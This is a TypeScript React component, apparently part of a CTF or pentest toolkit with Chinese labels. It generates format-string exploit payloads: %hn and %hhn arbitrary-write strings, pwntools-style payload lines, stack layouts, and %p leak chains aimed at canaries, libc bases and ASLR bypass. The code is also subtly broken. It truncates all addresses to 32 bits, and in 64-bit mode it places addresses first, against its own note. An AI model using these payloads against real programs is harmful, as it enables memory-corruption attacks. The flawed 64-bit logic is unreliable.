import SimpleTool from '../../_shared/SimpleTool';
import { parseHex } from '../../_shared/hexUtils';
import type { ToolProps } from '../../types';

/* ============================================================
 * Format string vulnerability helper
 * Generates %hn / %hhn write payloads and %p leak payloads.
 * Supports 32-bit and 64-bit.
 * ========================================================== */

const padStr = (s: string, width: number): string => {
  return s.length >= width ? s : s + ' '.repeat(width - s.length);
};

const parseAddrNum = (tok: string): number => {
  const t = tok.trim().replace(/^0x/i, '');
  const v = parseInt(t, 16);
  if (Number.isNaN(v)) throw new Error(`无效的地址: ${tok}`);
  return v >>> 0;
};

const addrToBytes = (addr: number, bits: 32 | 64): number[] => {
  const nbytes = bits / 8;
  const out: number[] = [];
  const u = BigInt(addr);
  for (let i = 0; i < nbytes; i++) {
    out.push(Number((u >> BigInt(i * 8)) & 0xffn));
  }
  return out;
};

const addrToHexStr = (addr: number, bits: 32 | 64): string => {
  return '\\x' + addrToBytes(addr, bits)
    .map((b) => b.toString(16).padStart(2, '0'))
    .join('\\x');
};

/* ---------- short write (%hn) ---------- */

const genShortWrite = (
  targetAddr: number,
  offset: number,
  bits: 32 | 64,
  value: number,
): string => {
  // %hn writes 2 bytes at a time. For a 4-byte value, split into 2 shorts.
  const low = value & 0xffff;
  const high = (value >> 16) & 0xffff;

  // Two target addresses: targetAddr and targetAddr+2
  const addr1 = targetAddr;
  const addr2 = (targetAddr + 2) >>> 0;

  // Build stack layout: addr1, addr2 are placed at known offsets
  // The format string references them via %<offset>$hn
  const off1 = offset;
  const off2 = offset + 1;

  // Calculate written-so-far counter
  // On 32-bit: each address is 4 bytes, so writing 2 addresses = 8 bytes already on stack
  // On 64-bit: each address is 8 bytes, so 16 bytes
  const addrBytes = bits / 8;
  const initialWritten = addrBytes * 2;

  // We need to write two shorts. Sort by value to make padding calculation work.
  const writes = [
    { addr: addr1, val: low, off: off1 },
    { addr: addr2, val: high, off: off2 },
  ];
  writes.sort((a, b) => a.val - b.val);

  const lines: string[] = [];
  lines.push(`── %hn 短写入 payload (${bits}位) ──`);
  lines.push('');
  lines.push(` [目标地址] 0x${targetAddr.toString(16)}`);
  lines.push(` [写入值]   0x${value.toString(16).padStart(8, '0')}`);
  lines.push(` [偏移量]   ${offset}`);
  lines.push('');
  lines.push(' 写入拆分:');
  lines.push(`   低16位 (0x${low.toString(16).padStart(4, '0')}) -> 地址 0x${addr1.toString(16)} (偏移 ${off1})`);
  lines.push(`   高16位 (0x${high.toString(16).padStart(4, '0')}) -> 地址 0x${addr2.toString(16)} (偏移 ${off2})`);
  lines.push('');

  // Build payload string
  // Format: <addr1><addr2>%<pad1>c%<off1>$hn%<pad2>c%<off2>$hn
  let written = initialWritten;
  const parts: string[] = [];
  // Place addresses first (in payload as raw bytes)
  parts.push(`(地址1: ${addrToHexStr(addr1, bits)})`);
  parts.push(`(地址2: ${addrToHexStr(addr2, bits)})`);

  const payloadParts: string[] = [];

  for (let i = 0; i < writes.length; i++) {
    const w = writes[i];
    let need = w.val - written;
    if (need < 0) need += 0x10000; // wrap around
    if (need > 0) {
      parts.push(`%${need}c`);
      payloadParts.push(`%${need}c`);
      written = (written + need) & 0xffff;
    } else if (i === 0) {
      // need at least something? if val is 0 we still can write
      // Actually if val == 0 and written wraps, we need 0x10000
      // But typically we just write %hn directly if val matches
    }
    parts.push(`%${w.off}$hn`);
    payloadParts.push(`%${w.off}$hn`);
    written = w.val & 0xffff;
  }

  lines.push(' Payload 构造:');
  lines.push(`   ${parts.join('')}`);
  lines.push('');
  lines.push(' 实际 payload (含地址字节):');
  // Show as Python-style payload
  const pyParts: string[] = [];
  pyParts.push(`p64(${addr1.toString(16)})  # 或 p32, 取决于架构`);
  pyParts.push(`p64(${addr2.toString(16)})`);
  let pyWritten = initialWritten;
  for (let i = 0; i < writes.length; i++) {
    const w = writes[i];
    let need = w.val - pyWritten;
    if (need < 0) need += 0x10000;
    if (need > 0) {
      pyParts.push(`b"%${need}c"`);
      pyWritten = (pyWritten + need) & 0xffff;
    }
    pyParts.push(`b"%${w.off}$hn"`);
    pyWritten = w.val & 0xffff;
  }
  lines.push(`   payload = ${pyParts.join(' + ')}`);
  lines.push('');
  lines.push(' 栈布局示意:');
  lines.push(`  ${padStr('栈偏移', 10)}  ${padStr('内容', 20)}  说明`);
  lines.push(`  ${'-'.repeat(10)}  ${'-'.repeat(20)}  ${'-'.repeat(40)}`);
  lines.push(`  ${padStr(`rsp+${0}`, 10)}  ${padStr(addrToHexStr(addr1, bits), 20)}  目标地址1 (低16位)`);
  lines.push(`  ${padStr(`rsp+${addrBytes}`, 10)}  ${padStr(addrToHexStr(addr2, bits), 20)}  目标地址2 (高16位)`);
  lines.push(`  ${padStr(`rsp+${addrBytes*2}`, 10)}  ${padStr('格式字符串', 20)}  %<N>c%<off>$hn ...`);
  lines.push('');
  lines.push(' 说明:');
  lines.push('  - %hn 写入2字节, 需要两次写入覆盖4字节');
  lines.push('  - 按值从小到大排序, 利用 %<N>c 累加已写字符数');
  lines.push(`  - 地址作为参数放在栈上, 偏移 ${offset} 和 ${offset + 1}`);
  lines.push('  - 64位下地址含 \\x00 会截断, 需将地址放在 payload 末尾');
  return lines.join('\n');
};

/* ---------- byte write (%hhn) ---------- */

const genByteWrite = (
  targetAddr: number,
  offset: number,
  bits: 32 | 64,
  value: number,
): string => {
  // %hhn writes 1 byte at a time. For a 4-byte value, split into 4 bytes.
  const bytes = [
    { val: value & 0xff, off: offset, addr: targetAddr },
    { val: (value >> 8) & 0xff, off: offset + 1, addr: (targetAddr + 1) >>> 0 },
    { val: (value >> 16) & 0xff, off: offset + 2, addr: (targetAddr + 2) >>> 0 },
    { val: (value >> 24) & 0xff, off: offset + 3, addr: (targetAddr + 3) >>> 0 },
  ];
  // sort by value ascending for padding
  const sorted = [...bytes].sort((a, b) => a.val - b.val);

  const lines: string[] = [];
  lines.push(`── %hhn 字节写入 payload (${bits}位) ──`);
  lines.push('');
  lines.push(` [目标地址] 0x${targetAddr.toString(16)}`);
  lines.push(` [写入值]   0x${value.toString(16).padStart(8, '0')}`);
  lines.push(` [偏移量]   ${offset}`);
  lines.push('');
  lines.push(' 写入拆分:');
  bytes.forEach((b, i) => {
    lines.push(`   字节${i} (0x${b.val.toString(16).padStart(2, '0')}) -> 地址 0x${b.addr.toString(16)} (偏移 ${b.off})`);
  });
  lines.push('');

  const addrBytes = bits / 8;
  const initialWritten = addrBytes * 4;

  lines.push(' Payload 构造:');
  const parts: string[] = [];
  bytes.forEach((b) => {
    parts.push(`(地址${b.off - offset + 1}: ${addrToHexStr(b.addr, bits)})`);
  });
  let written = initialWritten;
  for (let i = 0; i < sorted.length; i++) {
    const w = sorted[i];
    let need = w.val - written;
    if (need < 0) need += 0x100;
    if (need > 0) {
      parts.push(`%${need}c`);
      written = (written + need) & 0xff;
    }
    parts.push(`%${w.off}$hhn`);
    written = w.val & 0xff;
  }
  lines.push(`   ${parts.join('')}`);
  lines.push('');
  lines.push(' 实际 payload (Python 风格):');
  const pyParts: string[] = [];
  bytes.forEach((b, i) => {
    pyParts.push(`p${bits}(${b.addr.toString(16)})  # 地址${i + 1}`);
  });
  written = initialWritten;
  for (let i = 0; i < sorted.length; i++) {
    const w = sorted[i];
    let need = w.val - written;
    if (need < 0) need += 0x100;
    if (need > 0) {
      pyParts.push(`b"%${need}c"`);
      written = (written + need) & 0xff;
    }
    pyParts.push(`b"%${w.off}$hhn"`);
    written = w.val & 0xff;
  }
  lines.push(`   payload = ${pyParts.join(' + ')}`);
  lines.push('');
  lines.push(' 栈布局示意:');
  lines.push(`  ${padStr('栈偏移', 10)}  ${padStr('内容', 20)}  说明`);
  lines.push(`  ${'-'.repeat(10)}  ${'-'.repeat(20)}  ${'-'.repeat(40)}`);
  bytes.forEach((b, i) => {
    lines.push(`  ${padStr(`rsp+${i * addrBytes}`, 10)}  ${padStr(addrToHexStr(b.addr, bits), 20)}  目标地址${i + 1} (字节${i})`);
  });
  lines.push(`  ${padStr(`rsp+${4 * addrBytes}`, 10)}  ${padStr('格式字符串', 20)}  %<N>c%<off>$hhn ...`);
  lines.push('');
  lines.push(' 说明:');
  lines.push('  - %hhn 写入1字节, 需要四次写入覆盖4字节');
  lines.push('  - 精度最高, 但 payload 较长');
  lines.push(`  - 4个目标地址放在栈上, 偏移 ${offset}~${offset + 3}`);
  return lines.join('\n');
};

/* ---------- leak (%p chain) ---------- */

const genLeak = (offset: number, bits: 32 | 64, count: number): string => {
  const lines: string[] = [];
  lines.push(`── %p 泄露 payload (${bits}位) ──`);
  lines.push('');
  lines.push(` [起始偏移] ${offset}`);
  lines.push(` [泄露数量] ${count} 个指针`);
  lines.push('');
  lines.push(' Payload:');
  const parts: string[] = [];
  for (let i = 0; i < count; i++) {
    parts.push(`%${offset + i}$p`);
  }
  const payload = parts.join('.');
  lines.push(`   ${payload}`);
  lines.push('');
  lines.push(' Python 风格:');
  const pyParts: string[] = [];
  for (let i = 0; i < count; i++) {
    pyParts.push(`b"%${offset + i}$p"`);
  }
  lines.push(`   payload = ${pyParts.join(' + b"." + ')}`);
  lines.push('');
  lines.push(' 解析说明:');
  lines.push('  - %p 会以 0x... 格式打印栈上的指针值');
  lines.push(`  - 从偏移 ${offset} 开始, 逐个泄露栈上的 8 字节 (${bits}位) 数据`);
  lines.push('  - 通过泄露的地址可以:');
  lines.push('     * 确认输入在栈上的偏移 (AAAA -> 0x41414141)');
  lines.push('     * 泄露 canary 值');
  lines.push('     * 泄露 libc 函数返回地址, 计算 libc 基址');
  lines.push('     * 泄露栈地址, 绕过 ASLR');
  lines.push('');
  lines.push(' 快速偏移探测 payload:');
  const probeParts: string[] = [];
  for (let i = offset; i < offset + Math.min(count, 10); i++) {
    probeParts.push(`%${i}$p`);
  }
  lines.push(`   ${probeParts.join('.')}`);
  return lines.join('\n');
};

/* ---------- Execute ---------- */

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="格式化字符串漏洞辅助"
    paramsConfig={[
      {
        name: 'arch',
        label: '架构',
        type: 'select',
        default: '64',
        options: [
          { value: '32', label: '32位' },
          { value: '64', label: '64位' },
        ],
      },
      {
        name: 'offset',
        label: '偏移量',
        type: 'text',
        default: '6',
        placeholder: '数字',
      },
      {
        name: 'method',
        label: '方法',
        type: 'select',
        default: 'short-write',
        options: [
          { value: 'short-write', label: '%hn短写入' },
          { value: 'byte-write', label: '%hhn字节写入' },
          { value: 'leak', label: '%p泄露' },
        ],
      },
      {
        name: 'value',
        label: '写入值',
        type: 'text',
        default: '0x08048456',
        placeholder: 'hex值',
      },
      {
        name: 'target_addr',
        label: '目标地址',
        type: 'text',
        default: '0x804a024',
        placeholder: 'hex地址',
      },
    ]}
    modeOptions={[
      { value: 'write-percent-n', label: '%n写入' },
      { value: 'leak-percent-p', label: '%p泄露' },
    ]}
    execute={(
      input: string,
      mode: string,
      params: Record<string, unknown>,
    ): string => {
      const arch = (params.arch === '32' ? 32 : 64) as 32 | 64;
      const offsetStr = (params.offset as string) ?? '6';
      const offset = parseInt(offsetStr, 10);
      if (Number.isNaN(offset) || offset < 0) {
        throw new Error('偏移量必须是非负整数');
      }
      const method = (params.method as string) ?? 'short-write';
      const targetAddrStr = (params.target_addr as string) ?? (input.trim() || '0x804a024');
      const targetAddr = parseAddrNum(targetAddrStr);
      const valueStr = (params.value as string) ?? '0x08048456';
      const value = parseAddrNum(valueStr);

      // mode takes precedence
      if (mode === 'leak-percent-p') {
        return genLeak(offset, arch, 20);
      }
      // write-percent-n mode
      switch (method) {
        case 'short-write':
          return genShortWrite(targetAddr, offset, arch, value);
        case 'byte-write':
          return genByteWrite(targetAddr, offset, arch, value);
        case 'leak':
          return genLeak(offset, arch, 20);
        default:
          return genShortWrite(targetAddr, offset, arch, value);
      }
    }}
  />
);

export default ToolComponent;
